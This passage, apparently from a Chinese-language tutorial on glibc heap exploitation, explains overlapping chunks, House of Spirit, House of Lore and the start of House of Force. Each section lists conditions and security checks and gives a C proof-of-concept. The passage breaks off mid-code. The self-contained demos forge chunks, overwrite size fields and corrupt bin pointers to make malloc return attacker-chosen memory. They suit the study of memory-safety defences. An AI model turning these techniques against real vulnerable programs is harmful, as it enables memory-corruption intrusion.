<p>本攻击适用于能够增加被free的chunk的大小，使得下一次malloc时能够覆盖被free的chunk后面的chunk</p>
<ul>
<li>条件<ul>
<li>能够增加已经free的chunk的大小</li>
</ul>
</li>
<li>安全检查<ul>
<li>设置已free的chunk的PREV_INUSE为1，（不是必须？？）</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cm">/*</span>

<span class="cm"> A simple tale of overlapping chunk.</span>
<span class="cm"> This technique is taken from</span>
<span class="cm"> http://www.contextis.com/documents/120/Glibc_Adventures-The_Forgotten_Chunks.pdf</span>

<span class="cm">*/</span>

<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdint.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span> <span class="p">,</span> <span class="kt">char</span><span class="o">*</span> <span class="n">argv</span><span class="p">[]){</span>


    <span class="kt">intptr_t</span> <span class="o">*</span><span class="n">p1</span><span class="p">,</span><span class="o">*</span><span class="n">p2</span><span class="p">,</span><span class="o">*</span><span class="n">p3</span><span class="p">,</span><span class="o">*</span><span class="n">p4</span><span class="p">;</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">This is a simple chunks overlapping problem</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Let&#39;s start to allocate 3 chunks on the heap</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">p1</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">p2</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">p3</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x80</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The 3 chunks have been allocated here:</span><span class="se">\n</span><span class="s">p1=%p</span><span class="se">\n</span><span class="s">p2=%p</span><span class="se">\n</span><span class="s">p3=%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p1</span><span class="p">,</span> <span class="n">p2</span><span class="p">,</span> <span class="n">p3</span><span class="p">);</span>

    <span class="n">memset</span><span class="p">(</span><span class="n">p1</span><span class="p">,</span> <span class="sc">&#39;1&#39;</span><span class="p">,</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">p2</span><span class="p">,</span> <span class="sc">&#39;2&#39;</span><span class="p">,</span> <span class="mh">0x100</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">p3</span><span class="p">,</span> <span class="sc">&#39;3&#39;</span><span class="p">,</span> <span class="mh">0x80</span> <span class="o">-</span> <span class="mi">8</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Now let&#39;s free the chunk p2</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">p2</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The chunk p2 is now in the unsorted bin ready to serve possible</span><span class="se">\n</span><span class="s">new malloc() of its size</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now let&#39;s simulate an overflow that can overwrite the size of the</span><span class="se">\n</span><span class="s">chunk freed p2.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;For a toy program, the value of the last 3 bits is unimportant;&quot;</span>
        <span class="s">&quot; however, it is best to maintain the stability of the heap.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;To achieve this stability we will mark the least signifigant bit as 1 (prev_inuse),&quot;</span>
        <span class="s">&quot; to assure that p1 is not mistaken for a free chunk.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="kt">int</span> <span class="n">evil_chunk_size</span> <span class="o">=</span> <span class="mh">0x181</span><span class="p">;</span>
    <span class="kt">int</span> <span class="n">evil_region_size</span> <span class="o">=</span> <span class="mh">0x180</span> <span class="o">-</span> <span class="mi">8</span><span class="p">;</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We are going to set the size of chunk p2 to to %d, which gives us</span><span class="se">\n</span><span class="s">a region size of %d</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span>
         <span class="n">evil_chunk_size</span><span class="p">,</span> <span class="n">evil_region_size</span><span class="p">);</span>

    <span class="o">*</span><span class="p">(</span><span class="n">p2</span><span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="o">=</span> <span class="n">evil_chunk_size</span><span class="p">;</span> <span class="c1">// we are overwriting the &quot;size&quot; field of chunk p2</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Now let&#39;s allocate another chunk with a size equal to the data</span><span class="se">\n</span><span class="s">&quot;</span>
           <span class="s">&quot;size of the chunk p2 injected size</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This malloc will be served from the previously freed chunk that</span><span class="se">\n</span><span class="s">&quot;</span>
           <span class="s">&quot;is parked in the unsorted bin which size has been modified by us</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">p4</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">evil_region_size</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">p4 has been allocated at %p and ends at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p4</span><span class="p">,</span> <span class="n">p4</span><span class="o">+</span><span class="n">evil_region_size</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p3 starts at %p and ends at %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">p3</span><span class="p">,</span> <span class="n">p3</span><span class="o">+</span><span class="mi">80</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p4 should overlap with p3, in this case p4 includes all p3.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">Now everything copied inside chunk p4 can overwrites data on</span><span class="se">\n</span><span class="s">chunk p3,&quot;</span>
        <span class="s">&quot; and data written to chunk p3 can overwrite data</span><span class="se">\n</span><span class="s">stored in the p4 chunk.</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Let&#39;s run through an example. Right now, we have:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p4 = %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p4</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p3 = %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p3</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">If we memset(p4, &#39;4&#39;, %d), we have:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">evil_region_size</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">p4</span><span class="p">,</span> <span class="sc">&#39;4&#39;</span><span class="p">,</span> <span class="n">evil_region_size</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p4 = %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p4</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p3 = %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p3</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;</span><span class="se">\n</span><span class="s">And if we then memset(p3, &#39;3&#39;, 80), we have:</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">memset</span><span class="p">(</span><span class="n">p3</span><span class="p">,</span> <span class="sc">&#39;3&#39;</span><span class="p">,</span> <span class="mi">80</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p4 = %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p4</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;p3 = %s</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">p3</span><span class="p">);</span>
<span class="p">}</span>
</pre></div>

<h2 id="4-house-of-spirit-freechunk">4. House of Spirit / Free虚假的chunk</h2>
<p>该攻击方式与UAF类似，只不过是直接free掉虚假的chunk，这样就可以在下次malloc的时候直接获取我们虚假的chunk</p>
<ul>
<li>条件<ul>
<li>能够free虚假的chunk</li>
</ul>
</li>
<li>安全检查<ul>
<li>虚假的chunk以及该chunk后面chunk的大小需要满足安全检查，fastbin与smallbin的检查不同</li>
<li>fastchunk需要检查不是top chunk</li>
<li>smallchunk需要检查inuse和top chunk</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">fast_chunk</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>               <span class="c1">// chunk falls in fastbin size range</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">struct</span> <span class="n">fast_chunk</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>   <span class="c1">// Two chunks in consecutive memory</span>
  <span class="kt">void</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>

  <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>

  <span class="c1">// Passes size check of &quot;free(): invalid size&quot;</span>
  <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fast_chunk</span><span class="p">);</span>

  <span class="c1">// Passes &quot;free(): invalid next size (fast)&quot;</span>
  <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">].</span><span class="n">size</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">fast_chunk</span><span class="p">)</span><span class="o">+</span><span class="mh">0x10</span><span class="p">;</span>

  <span class="c1">// Attacker overwrites a pointer that is about to be &#39;freed&#39;</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="p">(</span><span class="kt">void</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="n">fd</span><span class="p">;</span>

  <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>

  <span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span>
<span class="p">{</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This file demonstrates the house of spirit attack.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Calling malloc() once so that it sets up its memory.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">malloc</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;We will now overwrite a pointer to point to a fake &#39;fastbin&#39; region.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">a</span><span class="p">;</span>
    <span class="c1">// This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)</span>
    <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">10</span><span class="p">]</span> <span class="n">__attribute__</span> <span class="p">((</span><span class="n">aligned</span> <span class="p">(</span><span class="mi">16</span><span class="p">)));</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">fake_chunks</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">7</span><span class="p">]);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category (&lt;= 128 on x64). The PREV_INUSE (lsb) bit is ignored by free for fastbin-sized chunks, however the IS_MMAPPED (second lsb) and NON_MAIN_ARENA (third lsb) bits cause problems.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that this has to be the size of the next malloc request rounded to the internal size used by the malloc implementation. E.g. on x64, 0x30-0x38 will all be rounded to 0x40, so they would work for the malloc parameter at the end. </span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x40</span><span class="p">;</span> <span class="c1">// this is the size</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;The chunk.size of the *next* fake region has to be sane. That is &gt; 2*SIZE_SZ (&gt; 16 on x64) &amp;&amp; &lt; av-&gt;system_mem (&lt; 128kb by default for the main arena) to pass the nextsize integrity checks. No need for fastbin size.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
        <span class="c1">// fake_chunks[9] because 0x40 / sizeof(unsigned long long) = 8</span>
    <span class="n">fake_chunks</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span> <span class="o">=</span> <span class="mh">0x1234</span><span class="p">;</span> <span class="c1">// nextsize</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;... note that the memory address of the *region* associated with this chunk must be 16-byte aligned.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">a</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">];</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Freeing the overwritten pointer.</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
    <span class="n">free</span><span class="p">(</span><span class="n">a</span><span class="p">);</span>

    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;Now the next malloc will return the region of our fake chunk at %p, which will be %p!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="o">&amp;</span><span class="n">fake_chunks</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span>
    <span class="n">fprintf</span><span class="p">(</span><span class="n">stderr</span><span class="p">,</span> <span class="s">&quot;malloc(0x30): %p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">));</span>
<span class="p">}</span>
</pre></div>

<h2 id="5-house-of-lore-uaf-on-smallbin">5. House of Lore / UAF on smallbin</h2>
<p>这个攻击其实是针对smallbin的forging chunks attack，如果我们能够修改已经被free的smallchunk的fd和bk，那么我们可以伪装使得malloc返回我们自定义的chunk，这里malloc smallchunk时是从尾部取的。</p>
<ul>
<li>条件<ul>
<li>能够修改已free的chunk的fd和bk</li>
</ul>
</li>
<li>安全检查<ul>
<li>malloc时，设尾部的chunk为victim，则需保证<code>victim-&gt;bk-&gt;fd == victim</code>。该检查在malloc正常free的chunk时会有，此外在malloc假的chunk时也会有，因此需构造两个假的chunk来满足检查</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="k">struct</span> <span class="n">small_chunk</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">small_chunk</span> <span class="o">*</span><span class="n">fd</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">small_chunk</span> <span class="o">*</span><span class="n">bk</span><span class="p">;</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mh">0x64</span><span class="p">];</span>               <span class="c1">// chunk falls in smallbin size range</span>
<span class="p">};</span>

<span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
  <span class="k">struct</span> <span class="n">small_chunk</span> <span class="n">fake_chunk</span><span class="p">,</span> <span class="n">another_fake_chunk</span><span class="p">;</span>
  <span class="k">struct</span> <span class="n">small_chunk</span> <span class="o">*</span><span class="n">real_chunk</span><span class="p">;</span>
  <span class="kt">unsigned</span> <span class="kt">long</span> <span class="kt">long</span> <span class="o">*</span><span class="n">ptr</span><span class="p">,</span> <span class="o">*</span><span class="n">victim</span><span class="p">;</span>
  <span class="kt">int</span> <span class="n">len</span><span class="p">;</span>

  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">);</span>

  <span class="n">len</span> <span class="o">=</span> <span class="k">sizeof</span><span class="p">(</span><span class="k">struct</span> <span class="n">small_chunk</span><span class="p">);</span>

  <span class="c1">// Grab two small chunk and free the first one</span>
  <span class="c1">// This chunk will go into unsorted bin</span>
  <span class="n">ptr</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">ptr</span><span class="p">);</span>
  <span class="c1">// The second malloc can be of random size. We just want that</span>
  <span class="c1">// the first chunk does not merge with the top chunk on freeing</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>
  <span class="n">free</span><span class="p">(</span><span class="n">ptr</span><span class="p">);</span>

  <span class="n">real_chunk</span> <span class="o">=</span> <span class="p">(</span><span class="k">struct</span> <span class="n">small_chunk</span> <span class="o">*</span><span class="p">)(</span><span class="n">ptr</span> <span class="o">-</span> <span class="mi">2</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">real_chunk</span><span class="p">);</span>

  <span class="c1">// Grab another chunk with greater size so as to prevent getting back</span>
  <span class="c1">// the same one. Also, the previous chunk will now go from unsorted to</span>
  <span class="c1">// small bin</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">));</span>

  <span class="c1">// Make the real small chunk&#39;s bk pointer point to &amp;fake_chunk</span>
  <span class="c1">// This will insert the fake chunk in the smallbin</span>
  <span class="n">real_chunk</span><span class="o">-&gt;</span><span class="n">bk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>
  <span class="c1">// and fake_chunk&#39;s fd point to the small chunk</span>
  <span class="c1">// This will ensure that &#39;victim-&gt;bk-&gt;fd == victim&#39; for the real chunk</span>
  <span class="n">fake_chunk</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="n">real_chunk</span><span class="p">;</span>

  <span class="c1">// We also need this &#39;victim-&gt;bk-&gt;fd == victim&#39; test to pass for fake chunk</span>
  <span class="n">fake_chunk</span><span class="p">.</span><span class="n">bk</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">another_fake_chunk</span><span class="p">;</span>
  <span class="n">another_fake_chunk</span><span class="p">.</span><span class="n">fd</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">fake_chunk</span><span class="p">;</span>

  <span class="c1">// Remove the real chunk by a standard call to malloc</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">));</span>

  <span class="c1">// Next malloc for that size will return the fake chunk</span>
  <span class="n">victim</span> <span class="o">=</span> <span class="n">malloc</span><span class="p">(</span><span class="n">len</span><span class="p">);</span>
  <span class="n">printf</span><span class="p">(</span><span class="s">&quot;%p</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span> <span class="n">victim</span><span class="p">);</span>

  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span>
</pre></div>

<p>上述利用代码需要注意的两个地方，</p>
<ol>
<li>一个是free正常的chunk之前需要再申请任意大小的一个chunk，使得free时不会与top合并</li>
<li>free之后chunk会到unsorted bin，此时需要再次malloc另一个大小的chunk，让之前的chunk进入smallbin</li>
</ol>
<p>The state of the unsorted bin and the small bin are shown:</p>
<ol>
<li>
<p>free(ptr). Unsorted bin:</p>
<blockquote>
<p>head &lt;-&gt; ptr &lt;-&gt; tail</p>
</blockquote>
<p>Small bin:</p>
<blockquote>
<p>head &lt;-&gt; tail</p>
</blockquote>
</li>
</ol>
<ol>
<li>
<p>malloc(len + 0x10); Unsorted bin:</p>
<blockquote>
<p>head &lt;-&gt; tail</p>
</blockquote>
<p>Small bin:</p>
<blockquote>
<p>head &lt;-&gt; ptr &lt;-&gt; tail</p>
</blockquote>
</li>
</ol>
<ol>
<li>
<p>Pointer manipulations Unsorted bin:</p>
<blockquote>
<p>head &lt;-&gt; tail</p>
</blockquote>
<p>Small bin:</p>
<blockquote>
<p>undefined &lt;-&gt; fake_chunk &lt;-&gt; ptr &lt;-&gt; tail</p>
</blockquote>
</li>
</ol>
<ol>
<li>
<p>malloc(len) Unsorted bin:</p>
<blockquote>
<p>head &lt;-&gt; tail</p>
</blockquote>
<p>Small bin:</p>
<blockquote>
<p>undefined &lt;-&gt; fake_chunk &lt;-&gt; tail</p>
</blockquote>
</li>
</ol>
<ol>
<li>
<p>malloc(len) Unsorted bin:</p>
<blockquote>
<p>head &lt;-&gt; tail</p>
</blockquote>
<p>Small bin:</p>
<blockquote>
<p>undefined &lt;-&gt; tail [ Fake chunk is returned ]</p>
</blockquote>
</li>
</ol>
<p>Note that another 'malloc' call for the corresponding small bin will result in a segmentation fault.</p>
<h2 id="6-house-of-force-increase-top-chunk-size">6. House of Force / Increase top chunk size</h2>
<p>这个攻击是针对topchunk的攻击，如果我们可以修改topchunk的大小，将他改成特别大（-1），那么我们可以通过计算malloc的传入参数，使得我们可以用malloc返回任意的地址，这个任意地址可以在topchunk的前面和后面，因为malloc的参数是负数也可以，会整数溢出然后正常利用。</p>
<ul>
<li>条件<ul>
<li>能够修改top chunk的大小</li>
</ul>
</li>
</ul>
<div class="highlight"><pre><span></span><span class="cp">#include</span> <span class="cpf">&lt;unistd.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;string.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span> <span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="c1">// Attacker will force malloc to return this pointer</span>
<span class="kt">char</span> <span class="n">victim</span><span class="p">[]</span> <span class="o">=</span> <span class="s">&quot;This is victim&#39;s string that will returned by malloc&quot;</span><span class="p">;</span>

<span class="k">struct</span> <span class="n">chunk_structure</span> <span class="p">{</span>
  <span class="kt">size_t</span> <span class="n">prev_size</span><span class="p">;</span>
  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>
